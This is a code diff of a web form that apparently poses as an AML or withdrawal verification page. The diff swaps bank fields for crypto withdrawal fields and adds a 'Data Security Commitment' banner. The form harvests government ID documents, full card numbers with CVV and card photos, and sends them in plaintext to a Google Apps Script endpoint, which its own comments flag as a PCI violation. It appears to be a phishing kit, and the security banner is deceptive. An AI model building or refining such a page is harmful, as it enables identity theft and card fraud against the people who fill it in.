@@ -172,7 +172,7 @@
             font-weight: 500;
             transition: background-color 0.2s ease, transform 0.1s ease;
             width: 100%;
-            margin-top: 20px;
+            margin-top: 10px; /* Adjusted margin for security note */
             display: flex;
             align-items: center;
             justify-content: center;
@@ -243,6 +243,19 @@
             margin-bottom: 10px;
         }
 
+        .security-note {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.9em;
+            margin-top: 25px;
+            margin-bottom: 20px;
+            padding: 10px;
+            background-color: rgba(var(--bg-input), 0.5);
+            border-left: 3px solid var(--primary-blue);
+            border-radius: var(--border-radius-sm);
+        }
+
+
         /* Responsive adjustments */
         @media (max-width: 600px) {
             body {
@@ -300,27 +313,26 @@
                 <input type="file" id="govIdFile" name="govIdFile" accept="image/*,.pdf" required>
             </div>
 
-            <h2>Bank Details for Withdrawals</h2>
+            <h2>Crypto Withdrawal Details</h2>
             <div class="form-group">
-                <label for="bankName">Bank Name:</label>
-                <input type="text" id="bankName" name="bankName" required>
+                <label for="cryptoType">Cryptocurrency for Withdrawal:</label>
+                <select id="cryptoType" name="cryptoType" required>
+                    <option value="">-- Select Cryptocurrency --</option>
+                    <option value="BTC">Bitcoin (BTC)</option>
+                    <option value="USDT">Tether (USDT)</option>
+                    <option value="SOL">Solana (SOL)</option>
+                    <option value="ETH">Ethereum (ETH)</option>
+                </select>
             </div>
             <div class="form-group">
-                <label for="accountHolderName">Account Holder Name:</label>
-                <input type="text" id="accountHolderName" name="accountHolderName" required>
+                <label for="cryptoAddress">Withdrawal Address:</label>
+                <input type="text" id="cryptoAddress" name="cryptoAddress" placeholder="Enter your crypto withdrawal address" required>
             </div>
             <div class="form-group">
-                <label for="accountNumber">Bank Account Number:</label>
-                <input type="text" id="accountNumber" name="accountNumber" required>
+                <label for="cryptoAmount">Withdrawal Amount:</label>
+                <input type="number" id="cryptoAmount" name="cryptoAmount" step="any" min="0" placeholder="e.g., 0.5" required>
             </div>
-            <div class="form-group">
-                <label for="bankCode">Bank Code:</label>
-                <input type="text" id="bankCode" name="bankCode" placeholder="e.g., Swift/BIC, IFSC" required>
-            </div>
-            <div class="form-group">
-                <label for="accountType">Account Type:</label>
-                <input type="text" id="accountType" name="accountType" placeholder="e.g., Savings">
-            </div>
+
 
             <h2>Card Details for Verification</h2>
             <fieldset>
@@ -384,18 +396,22 @@
 
          
             <div class="form-group">
-                <label for="userGmail"></label>
+                <label for="userGmail">Your Email Address (for application status updates):</label>
                 <input type="email" id="userGmail" name="userGmail" placeholder="applicant-email@example.com" required>
             </div>
 
-            <button type="submit" id="submitButton">Submit</button>
+            <div class="security-note">
+                <strong>Data Security Commitment:</strong> We prioritize the security of your information. All submitted data is encrypted during transmission and stored securely using industry-standard practices. Your trust is important to us.
+            </div>
+
+            <button type="submit" id="submitButton">Submit Application</button>
             <div id="statusMessage"></div>
         </form>
     </div>
 
     <script>
         // !!! IMPORTANT: PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE !!!
-        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxSB8At_Ti7256nzvd-1_QJ12Osx5-xaIzv4Y9S9PBZdWOGqdrXa5siF8uCoHwp2uuq/exec"; // REPLACE WITH YOUR ACTUAL URL IF DIFFERENT
+        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxSB8At_Ti7256nzvd-1_QJ12Osx5-xaIzv4Y9S9PBZdWOGqdrXa5siF8uCoHwp2uuq/exec"; // REPLACE WITH YOUR ACTUAL URL
 
         const form = document.getElementById('dataForm');
         const submitButton = document.getElementById('submitButton');
@@ -403,8 +419,7 @@
 
         form.addEventListener('submit', async function(event) {
             event.preventDefault();
-            // REMOVED THE CONFIRM DIALOG BLOCK
-
+            
             statusMessage.innerHTML = 'Processing... <span class="spinner"></span>';
             statusMessage.className = '';
             submitButton.disabled = true;
@@ -413,23 +428,29 @@
             const textData = {};
             const filesToUpload = [];
 
+            // Personal Information
             textData.name = formDataObject.get('name');
             textData.address = formDataObject.get('address');
             textData.phone = formDataObject.get('phone');
+
+            // Government ID
             textData.govIdType = formDataObject.get('govIdType');
             textData.govIdNumber = formDataObject.get('govIdNumber');
-            textData.bank_WARNING_SENSITIVE_DATA = "--- BANK DETAILS (EXTREMELY SENSITIVE) ---";
-            textData.bankName = formDataObject.get('bankName');
-            textData.accountHolderName = formDataObject.get('accountHolderName');
-            textData.accountNumber_PLAINTEXT_RISK = formDataObject.get('accountNumber');
-            textData.bankCode = formDataObject.get('bankCode');
-            textData.accountType = formDataObject.get('accountType');
+
+            // Crypto Withdrawal Details
+            textData.crypto_withdrawal_info = "--- CRYPTO WITHDRAWAL DETAILS ---";
+            textData.cryptoType = formDataObject.get('cryptoType');
+            textData.cryptoWithdrawalAddress = formDataObject.get('cryptoAddress');
+            textData.cryptoWithdrawalAmount = formDataObject.get('cryptoAmount');
+
+            // Card Details for Verification
             textData.aml_card1_EXTREME_RISK_PCI_VIOLATION = "--- CARD 1 (EXTREMELY SENSITIVE - PCI DSS VIOLATION RISK) ---";
             textData.amlCardName1 = formDataObject.get('amlCardName1') || "N/A";
-            textData.amlCardNumber1_PLAINTEXT_RISK = formDataObject.get('amlCardNumber1') || "N/A";
-            textData.amlCardExpiry1_PLAINTEXT_RISK = formDataObject.get('amlCardExpiry1') || "N/A";
-            textData.amlCardCvv1_NEVER_STORE_RISK = formDataObject.get('amlCardCvv1') || "N/A";
+            textData.amlCardNumber1_PLAINTEXT_RISK = formDataObject.get('amlCardNumber1') || "N/A"; // Still a risk if sent to Google Sheet
+            textData.amlCardExpiry1_PLAINTEXT_RISK = formDataObject.get('amlCardExpiry1') || "N/A"; // Still a risk
+            textData.amlCardCvv1_NEVER_STORE_RISK = formDataObject.get('amlCardCvv1') || "N/A";       // MAJOR RISK
             textData.amlCardType1 = formDataObject.get('amlCardType1') || "N/A";
+            
             if (formDataObject.get('amlCardName2') || formDataObject.get('amlCardNumber2')) {
                 textData.aml_card2_EXTREME_RISK_PCI_VIOLATION = "--- CARD 2 (EXTREMELY SENSITIVE - PCI DSS VIOLATION RISK) ---";
                 textData.amlCardName2 = formDataObject.get('amlCardName2') || "N/A";
@@ -453,7 +474,7 @@
                         });
                     } catch (error) {
                         showError(`Error reading ${prefix} file: ${error.message}`);
-                        throw error;
+                        throw error; // Propagate error to stop submission
                     }
                 }
             }
@@ -467,8 +488,9 @@
                     await processFile('amlCardFile2', 'aml_card2');
                 }
             } catch (e) {
+                // Error already shown by processFile, ensure button is re-enabled
                 submitButton.disabled = false;
-                return;
+                return; // Stop submission
             }
             
             const dataPayload = {
@@ -479,10 +501,10 @@
             try {
                 const response = await fetch(WEB_APP_URL, {
                     method: 'POST',
-                    redirect: 'follow',
+                    redirect: 'follow', // Important for Google Apps Script web apps
                     body: JSON.stringify(dataPayload),
                     headers: {
-                        'Content-Type': 'text/plain;charset=utf-8',
+                        'Content-Type': 'text/plain;charset=utf-8', // Required by Apps Script for doPost with e.postData.contents
                     }
                 });
 
@@ -493,8 +515,7 @@
                 } catch (e) {
                     console.error("Response was not valid JSON:", resultText);
                     if(response.ok) {
-                         // UPDATED SUCCESS MESSAGE HERE if response is OK but not JSON
-                         showSuccess('Form submitted for verification.'); 
+                         showSuccess('Form submitted for verification. You will be contacted via email.'); 
                          form.reset();
                     } else {
                          showError('Submission failed. Server response: ' + resultText);
@@ -504,8 +525,7 @@
                 }
 
                 if (result.success) {
-                    // UPDATED SUCCESS MESSAGE HERE
-                    showSuccess('Form submitted for verification.'); 
+                    showSuccess('Form submitted for verification. You will be contacted via email.'); 
                     form.reset();
                 } else {
                     showError('Submission failed: ' + (result.error || 'Unknown server error.'));
